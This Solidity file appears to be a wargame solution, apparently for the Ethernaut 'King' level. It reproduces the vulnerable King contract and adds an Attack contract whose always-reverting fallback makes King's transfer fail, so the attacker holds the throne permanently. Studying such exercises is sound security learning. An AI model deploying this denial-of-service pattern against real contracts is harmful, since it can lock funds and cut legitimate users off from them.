// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  fallback() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Attack {
    constructor() public payable {
        
    }
    
    function be_king() public {
        //put your instance address
        King k = King(0xDfF9DA3282359263e2e5180ED5E311302880fd9c);
        address(k).call.value(1000000000000000).gas(4000000)("");
    }
    
    fallback() external payable {
        require(1==0);
    }
}
